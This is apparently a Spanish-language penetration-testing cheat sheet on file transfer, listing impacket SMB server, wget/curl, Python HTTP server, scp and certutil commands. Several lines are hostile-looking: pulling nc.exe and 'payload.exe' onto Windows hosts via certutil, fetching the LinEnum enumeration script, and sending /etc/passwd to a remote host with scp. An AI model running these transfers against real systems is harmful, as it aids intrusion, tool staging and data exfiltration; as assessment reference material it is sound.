# Transferencia de Archivos

## Descripción
Comprender diferentes formas de realizar transferencias de archivos y cómo funcionan las redes puede ayudarnos a lograr nuestros objetivos durante una evaluación. Debemos ser conscientes de los controles del host que pueden impedir nuestras acciones, como la inclusión en listas blancas de aplicaciones o el bloqueo AV/EDR de aplicaciones o actividades específicas. Las transferencias de archivos también se ven afectadas por dispositivos de red como Firewalls, IDS o IPS que pueden monitorear o bloquear puertos particulares u operaciones poco comunes.

### Linux - Windows (smb no autenticado)

```python
sudo impacket-smbserver share -smb2support /tmp/smbshare (Linux)
copy \\192.168.220.133\share\nc.exe (windows)
```
### Windodws a linux (smb no autenticado)

```python
wget http://10.10.23.2/archivo.txt -O archivo_local.txt (shell en kali linux previamente)
```

### Linux - Windows (smb con autentificación)

```python
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test (Linux)
net use n: \\192.168.220.133\share\FILENAME /user:test test (windows)
```

### Web Download

```python
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Alternativas distintas
```python
python3 -m http.server
python2.7 -m SimpleHTTPServer
wget 192.168.49.128:8000/filetotransfer.txt
```

### SCP Upload
```python
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
scp archivo.txt usuario@192.168.1.100:/home/usuario (windows a kali)
```

### Certuil Tranferir archivos
```python
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe (windows)
certutil -urlcache -f http://10.10.23.2/payload.exe payload.exe (windows)
```
